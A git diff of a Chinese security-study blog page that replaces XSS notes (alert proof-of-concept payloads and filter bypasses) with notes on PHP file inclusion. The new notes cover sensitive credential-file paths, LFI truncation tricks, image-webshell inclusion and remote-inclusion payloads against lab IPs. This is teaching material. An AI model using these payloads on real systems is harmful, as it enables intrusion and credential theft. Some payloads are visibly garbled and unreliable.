@@ -16,20 +16,20 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="注： &lt;&gt; 统一写成《&gt; 要不然一点开一直弹窗XSS漏洞的概述漏洞的介绍. XSS又叫CsS (Cross Site Script)，全称跨站脚本攻击。它指的是攻击者往Web页面或者URL里插入恶意JavaScript脚本代码，如果Web应用程序对于用户输入的内容没有过滤，那么当正常用户浏览该网页的时候，嵌入在Web页面里的恶意JavaScript脚本代码会被执行，从而达到恶意攻">
+    <meta name="description" content="一、什么是文件包含漏洞？ 1、文件包含概述 和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。 什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。 有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xss漏洞">
-<meta property="og:url" content="http://example.com/2022/04/22/xss%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="文件包含漏洞">
+<meta property="og:url" content="http://example.com/2022/04/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="王海兴">
-<meta property="og:description" content="注： &lt;&gt; 统一写成《&gt; 要不然一点开一直弹窗XSS漏洞的概述漏洞的介绍. XSS又叫CsS (Cross Site Script)，全称跨站脚本攻击。它指的是攻击者往Web页面或者URL里插入恶意JavaScript脚本代码，如果Web应用程序对于用户输入的内容没有过滤，那么当正常用户浏览该网页的时候，嵌入在Web页面里的恶意JavaScript脚本代码会被执行，从而达到恶意攻">
+<meta property="og:description" content="一、什么是文件包含漏洞？ 1、文件包含概述 和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。 什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。 有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-04-21T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-04-22T13:17:44.509Z">
+<meta property="article:modified_time" content="2022-04-22T13:17:59.453Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
   
-  <title>xss漏洞 - 王海兴</title>
+  <title>文件包含漏洞 - 王海兴</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -175,7 +175,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="xss漏洞">
+            <span class="h2" id="subtitle" title="文件包含漏洞">
               
             </span>
 
@@ -196,7 +196,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      3.3k 字
+      3.6k 字
     </span>
   
 
@@ -205,7 +205,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      28 分钟
+      31 分钟
     </span>
   
 
@@ -242,22 +242,23 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">xss漏洞</h1>
+            <h1 style="display: none">文件包含漏洞</h1>
             
             <div class="markdown-body">
-              <p>注： &lt;&gt; 统一写成《&gt; 要不然一点开一直弹窗<br>XSS漏洞的概述<br>漏洞的介绍<br>. XSS又叫CsS (Cross Site Script)，全称跨站脚本攻击。它指的是攻击者往Web页面或者URL里插入恶意JavaScript脚本代码，如果Web应用程序对于用户输入的内容没有过滤，那么当正常用户浏览该网页的时候，嵌入在Web页面里的恶意JavaScript脚本代码会被执行，从而达到恶意攻击正常用户的目的。<br>漏洞的位置<br>·数据交互的地方∶<br>-get post cookies headers方法<br>-富文本编辑器<br>-各类标签插入和自定义<br>·数据输出的地方∶<br>-用户资料<br>-关键词、标签、说明<br>漏洞的原理<br>XSS，是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，获取控制用户浏览器进行操作的攻击方式。<br>服务端代码︰</p>
-<p>用户提交:<br>《script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script》</p>
-<p>xSS漏洞产生的两个条件<br>确定<br>1.可以控制的输入点<br>⒉.输入能返回到前端页面上被浏览器当成脚本语言解释执行<br>漏洞的分类<br>,<br>根据攻击手法的不同，XSS漏洞分为三类<br>类型 存储区 插入点<br>反射型XSS URL HTML<br>存储型XSS 后端数据库 HTML<br>DOM型xSS 后端数据库&#x2F;前端存储&#x2F;URL 前端JavaScript<br>反射型XSS<br>验证反射型xss漏洞存在的poc :<br>. 《script&gt;alert(&#x2F;xss&#x2F;)（常用)<br>·《script&gt;confirm(‘xss’)<br>. 《script&gt;prompt(‘xss’)<br>◆存储型XSs<br>概念︰持久性跨站脚本，是三种XSS中危害最大的。它是将恶意代码写进数据库或文件等可以永久保存数据的介质中&gt;存在位置:常出现在留言板、发表评论或发表文章的地方(数据写入的地方)<br>攻击手法:通过留言板等功能，将攻击者精心构造XSS代码，保存到数据库中，当其他用户再次访问这个页面时，就会触发并执行恶意的XSS代码，从而窃取用户的敏感信息。</p>
-<p>DOM型xSS<br>DOM型XSs<br>漏洞概念∶不经过后端，DOM-XSS漏洞是基于文档对象模型的一种漏洞，简单去理解就是因为输出点在DOMRDOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS.</p>
-<p>攻击手法∶<br>攻击者构造出特殊的URL，其中包含恶意代码。用户打开带有恶意代码的URL<br>用户浏览器接收到响应后解析执行，前端JavaScript取出URL中的恶意代码并执行。<br>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。<br>三种漏洞的区别<br>存储型XSS与反射型XSS的区别<br>·存储型XSS的恶意代码存在数据库里，反射型XSS的恶意代码存在URL里<br>DOM型与其他两种XSS的区别<br>.DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端JavaScript自身的安全漏洞，而其他两种XSS都属于服务端的安全漏洞</p>
-<p>xSS的简单利用有哪些:<br>1.xSS获取管理员权限(获取cookie) ——重要<br>2. XSS键盘记录——重要<br>3. XSS获取内网IP<br>xSS获取cookie<br>cookie的介绍︰指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据<br>cookie的作用:它可以记录用户ID、密码、停留时间等等，当再次访问这个网站时，浏览器会自动监这个文件，并将存储在本地的Cookie信息发送给网站，网站通过读取Cookie，得知相关信息，就可以做出相应的动作，比如:直接登陆，无需再次输入账号和密码。</p>
-<p>获取cookie的危害:窃取用户Cookie，冒充用户身份进入网站<br>cookie的格式:Cookie有变量名( key)和值( value )组成，属性中的变量用“变量&#x3D;值”的形式保存<br>Set-Cookie: 《name&gt; &#x3D; [; &#x3D;]…<br>l; expires&#x3D;《date&gt;][; domain&#x3D; ]<br>l; path&#x3D;《some_path&gt;][; secure][ ; httponly]</p>
-<p>2.伪协议的方式构造XSS<br>·可以使用javascript:伪协议的方式构造XSS ，html标签支持js伪协议形式，如src ,href ,background等·形式 : javascriptalert(&#x2F;xss&#x2F;);<br>·举例︰利用href标签的伪协议《a href&#x3D;”javascriptalert(&#x2F;xss&#x2F;)” &gt;touch me!</p>
-<p>通过href标签创建超链接，并通过伪协议进行xss攻击，所以点击了超链接就会进行弹窗操作。<br>XSS的变形与绕过<br>事件利用<br>。举例:<br>. 《img src&#x3D;’.&#x2F;smile.jpg’ onmouseover&#x3D;’alert(&#x2F;xss&#x2F;)’&gt;<br>·这个标签会引入一个图片，然后鼠标悬停在图片上的时候，触发XSS代码<br>其他事件利用<br>. 《input type&#x3D;”text” onkeydown&#x3D;”alert(&#x2F;xss&#x2F;)”&gt;当按下键盘任意一个按键的时候触发。. ·《input type&#x3D;“text” onkeyup&#x3D; “alert(&#x2F;xss&#x2F;)”&gt;当松开键盘任意一个按键的时候触发。·《input type&#x3D; “button” onclick&#x3D;”alert(&#x2F;xss&#x2F;)”&gt;当点击按钮时触发。<br>. 《img src&#x3D; ‘#’ onerror&#x3D; ‘alert(&#x2F;xss&#x2F;)”&gt;当img图片载入报错时触发。<br>5．其他标签以及手法<br>随着前端语言的更新和发展，会有新的标签和事件出现，所以前端的安全是个讨论不完的问题。<br>. 《svg onload&#x3D;”alert(&#x2F;xss&#x2F;)”&gt; svg是H5语言中的标签，配合事件可以触发XSS<br>·sXg是H5语言中的标签，配合事件可以触发XSS<br>. 《input onfocus&#x3D;alert(&#x2F;xss&#x2F;) autofocus&gt;<br>·onfocus事件是input标签中的新增事件，这个事件是当input输入框获取焦点时执行一段JS代码，从而触发XSS</p>
-<p>xSS的变形<br>3.左斜线[&#x2F;]代替空格。可以利用左斜线代替空格<br>原payload《Img sRc&#x3D;’#’ Onerror&#x3D;”alert(&#x2F;xss&#x2F;)” &#x2F;&gt; 一&lt;Img&#x2F;sRc&#x3D;’#’&#x2F;Onerror&#x3D;’alert(&#x2F;xss&#x2F;) &#x2F;&gt;<br>4.回车的使用<br>.可以在一些位置添加水平制表符和回车符，来绕过关键字检测<br>原payload : 《a href&#x3D;”javascriptalert:alert(&#x2F;xss&#x2F;)”&gt;click me _<br>《A hREf&#x3D;”j<br>a v<br>a s<br>c r<br>i p<br>t :<br>alert(&#x2F;xss&#x2F;)”&gt;click<br>me</p>
-<p>≥注意:一些函数不可以加回车，比如事件:onmoveover、onerror等，它们<br>alert(&#x2F;xss&#x2F;“&gt;click<br>对于html语言是完整的单词</p>
-<p>XSS的变形<br>5．对标签属性值进行转码<br>·可以对标签属性值进行转码，用来绕过过滤。对应编码如下<br>字母 ASCII码 十进制编码 十六进制编码<br>a 97 a a<br>e 101 &amp;#101 ; #x65;一<br>·原payload : 《a hREf&#x3D;”javaScript:alert(&#x2F;xss&#x2F;)” &gt;click me<br>编码<br>《A hREf&#x3D;”javascript:alert(&#x2F;xss&#x2F;)”&gt;click me!</p>
-<p>双写绕过《script&gt; 《scr《script&gt;ipt&gt;</p>
+              <p>一、什么是文件包含漏洞？</p>
+<p>1、文件包含概述</p>
+<p>和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。</p>
+<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。</p>
+<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
+<p>以PHP为例，常用的文件包含函数有以下四种：</p>
+<p>include()，require()，include_once()，require_once()</p>
+<p>区别如下：</p>
+<p>require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。<br>include()，找不到被包含的文件时只会产生警告，脚本将继续运行。<br>include_once()与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>require_once()与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>二.本地文件包含漏洞<br>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。<br>（1）使用绝对路径<br>使用绝对路径直接进行读取：<br>2）使用相对路径进行读取：<br>当前页面所在路径为C:\Apache24\htdocs\，我们需要使用…&#x2F;退到C盘再进行访问，构造路径如下：<br>…&#x2F;…&#x2F;windows&#x2F;system.ini<br>（3）一些常见的敏感信息路径：<br>Windows系统：<br>c:\boot.ini &#x2F;&#x2F; 查看系统版本<br>c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件<br>c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码<br>c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置<br>c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码<br>c:\windows\php.ini &#x2F;&#x2F; php 配置信息<br>Linux&#x2F;Unix系统：<br>&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息<br>&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件<br>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件<br>◆本地文件包含(LFI)<br>有限制本地文件包含漏洞绕过&gt;绕过方法<br>路径长度截断<br>·条件:1、Windows下要长于256字节，超出的部分会被丢弃<br>2、Linux下要长于4096字节，超出的部分会被丢弃。<br>192.168.152.143&#x2F;action2.php?action&#x3D;phpifo.php&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;<br>00截断<br>如果我们想通过文件包含漏洞读取本地敏感信息，就会遇到一些问题。因为服务器会给路径加上.&#x2F;site&#x2F;路径，以及.php后缀。<br>此时我们可以使用使用%00截断：<br>%00为结束符，在filename后带上%00，就可以截断末尾的.php。<br>当前路径为.&#x2F;site&#x2F;，如果要读取system.ini，则需要输入：…&#x2F;…&#x2F;…&#x2F;windows&#x2F;system.ini%00，<br>需要注意的是，%00截断需要php版本小于5.3.4，且关闭magic_quotes_gpc功能</p>
+<p>2、配合文件上传使用<br>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。<br>编辑一个图片马，找到上传点进行上传，文件保存的完整路径为：<br>C:\phpStudy\WWW\hackable\uploads\webshell.jpg<br>找到具有文件包含漏洞的页面 该页面用于读取C:\phpStudy\WWW\vulnerabilities\fi\路径中的文件 现在我们利用该页面去执行我们上传的图片马，路径需要从C:\phpStudy\WWW\vulnerabilities\fi\ 转到C:\phpStudy\WWW\hackable\uploads\webshell.jpg<br>192.168.211.151&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;..&#x2F;..&#x2F;hackable&#x2F;uploads&#x2F;webshell.jpg<br>使用webshell管理工具连接即可。</p>
+<p>远程文件包含(RFI)<br>远程包含的意思<br>·指的是能够包含远程服务器上的文件并执行，可以通过http(s)或者ftp 等方式，远程加载文性。危害<br>·由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。包含条件<br>. allow_url_include&#x3D;On（默认为OFF，需要在php.ini中手动打开)- allow _url_fopen &#x3D; On（是否允许打开远程文件)<br>·用户可以动态控制变量</p>
+<p>举例:<br>。[URL]?path&#x3D;<a target="_blank" rel="noopener" href="http://ip/info.php//%E9%80%9A%E8%BF%87http%E5%8D%8F%E8%AE%AE%E5%8A%A0%E8%BD%BD%E7%9B%AE%E6%A0%87%E6%9C%BA%E4%B8%AD%E7%9A%84info.php%E6%96%87%E4%BB%B6">http://ip/info.php//通过http协议加载目标机中的info.php文件</a><br>·[URL]?path&#x3D;ftp:&#x2F;&#x2F;用户名:密码@ip&#x2F;info.php &#x2F;&#x2F;通过ftp协议加载目标机中的info.php文件<br>文件包含漏洞的利用<br>远程文件包含(RFI)<br>有限制远程文件包含漏洞绕过绕过方法<br>1.问号绕过</p>
+<p>payload : ?action&#x3D;<a target="_blank" rel="noopener" href="http://192.168.152.143/phpinfo.php">http://192.168.152.143/phpinfo.php</a>?<br>2.#号绕过</p>
+<p>payload : ?action&#x3D;<a target="_blank" rel="noopener" href="http://192.168.152.143/phpinfo.php%23">http://192.168.152.143/phpinfo.php%23</a><br>文件包含漏洞的利用<br>漏洞的利用<br>1、端口探测<br>. url&#x3D;dict&#x2F;&#x2F;ip:802<br>2.包含上传的getshell<br>·上传图片马，利用文件包含我们的图片马，菜刀连接<br>3、包含日志文件GetShell<br>·为了避免在web中进行了url编码，进行报错，把报错信息写进日志<br>4、远程文件包含写shell<br>‘);<br>?&gt;<br>·在文件夹下会看到生成shell.php.内容为，当直接包含图片时，代码就会被执行<br>5、使用PHP伪协议GetShell<br>php:&#x2F;&#x2F;filter<br>·用途:常用于读取文件&#x2F;源码<br>·使用条件:allow..url..fopen : off&#x2F;on<br>allow..url..include : off&#x2F;on两个配置都为off的情况下是可以正常使用的<br>·使用:[?path&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;文件.php]<br>·注意∶通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell ,但能读取敏感文件。</p>
 
             </div>
             <hr>
@@ -278,12 +279,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2022/04/22/xss-labs1-12%E5%85%B3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">xss-labs1-12关</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/04/22/xss-labs1-12%E5%85%B3/">
-                        <span class="hidden-mobile">xss-labs1-12关</span>
+                      <a href="/2022/03/26/Linux/">
+                        <span class="hidden-mobile">Linux</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
